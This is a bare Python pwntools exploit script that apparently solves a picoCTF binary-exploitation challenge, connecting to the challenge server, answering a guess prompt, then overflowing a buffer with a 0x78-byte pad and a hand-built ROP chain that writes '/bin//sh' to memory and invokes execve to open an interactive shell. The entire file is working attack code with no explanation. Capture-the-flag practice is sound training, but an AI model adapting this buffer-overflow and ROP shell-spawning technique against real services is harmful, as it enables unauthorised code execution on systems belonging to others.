#!/usr/bin/env python
from pwn import *
from struct import pack
r = remote("jupiter.challenges.picoctf.org", 28953)
epath = "./vuln"
#r = process(epath)
e = ELF(epath)

r.recvuntil("guess?")
r.sendline(str(84))
p = b''

p += pack('<Q', 0x0000000000410ca3) # pop rsi ; ret
p += pack('<Q', 0x00000000006ba0e0) # @ .data
p += pack('<Q', 0x00000000004163f4) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000047ff91) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000410ca3) # pop rsi ; ret
p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
p += pack('<Q', 0x0000000000445950) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047ff91) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400696) # pop rdi ; ret
p += pack('<Q', 0x00000000006ba0e0) # @ .data
p += pack('<Q', 0x0000000000410ca3) # pop rsi ; ret
p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
p += pack('<Q', 0x000000000044a6b5) # pop rdx ; ret
p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
p += pack('<Q', 0x00000000004163f4) # pop rax ; ret
p += p64(59) # execve
p += p64(0x000000000040137c) # syscall
r.recvuntil("Name?")
r.sendline(flat(b"\x00"*0x78,
                p))

r.interactive()
r.close()
